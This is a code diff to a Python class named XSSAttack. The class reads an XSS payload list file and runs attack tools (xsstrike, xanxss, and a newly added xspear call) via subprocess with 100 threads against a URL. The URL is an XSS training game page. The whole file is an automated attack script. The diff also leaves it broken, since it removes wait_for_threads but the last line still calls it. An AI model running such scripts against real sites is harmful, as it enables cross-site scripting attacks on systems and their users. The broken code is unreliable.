@@ -1,7 +1,6 @@
 import requests
 from bs4 import BeautifulSoup
 import logging
-import threading
 import os
 import subprocess
 
@@ -14,7 +13,7 @@ class XSSAttack:
         url,
         time=25,
         checks=5,
-        num_attacks=1,
+        threads=1,
         attack_type="xanxxs",
         file="XanXSS/xss-payload-list.txt",
     ):
@@ -25,14 +24,11 @@ class XSSAttack:
         with open(self.file, "r") as file:
             self.payloads = [line.strip() for line in file]
         self.threads = []
-        self.num_attacks = num_attacks
+        self.threads = threads
         self.attack_type = attack_type
 
     def create_attacks(self):
-        for _ in range(self.num_attacks):
-            thread = threading.Thread(target=self.run_attack)
-            self.threads.append(thread)
-            thread.start()
+        self.run_attack()
 
     def run_attack(self):
         if self.attack_type == "xanxxs":
@@ -61,24 +57,30 @@ class XSSAttack:
             "-u",
             self.url,
             "-t",
-            str(self.num_attacks),
+            str(self.threads),
             "--file",
             self.file,
         ]
 
         subprocess.run(command)
 
-    def wait_for_threads(self):
-        for thread in self.threads:
-            thread.join()
+    def xspear_attack(self):
+        command = [
+            "xspear",
+            "-u",
+            self.url,
+            "-t",
+            str(self.threads),
+            "-o",
+            "json",
+        ]
+        subprocess.run(command)
 
 
 # Target URL
 target_url = "http://xss-game.appspot.com/level1/frame?query="
 
 # Create and launch attack
-attack = XSSAttack(
-    target_url, time=25, checks=5, num_attacks=100, attack_type="xsstrike"
-)
+attack = XSSAttack(target_url, time=25, checks=5, threads=100, attack_type="xsstrike")
 attack.create_attacks()
 attack.wait_for_threads()
